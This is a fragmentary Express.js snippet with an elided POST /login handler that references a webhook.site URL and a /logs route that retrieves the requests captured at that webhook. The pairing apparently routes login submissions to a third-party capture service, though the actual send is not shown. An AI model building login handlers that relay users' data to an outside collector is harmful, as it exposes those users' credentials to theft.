...
app.post('/login', (req, res) => {
    ...
    const webhookUrl = "https://webhook.site/6da65a62-4b5b-4b2f-89da-c44b93e34527";
...
app.get('/logs', async (req, res) => {
    try {
        const response = await axios.get('https://webhook.site/token/6da65a62-4b5b-4b2f-89da-c44b93e34527/requests');
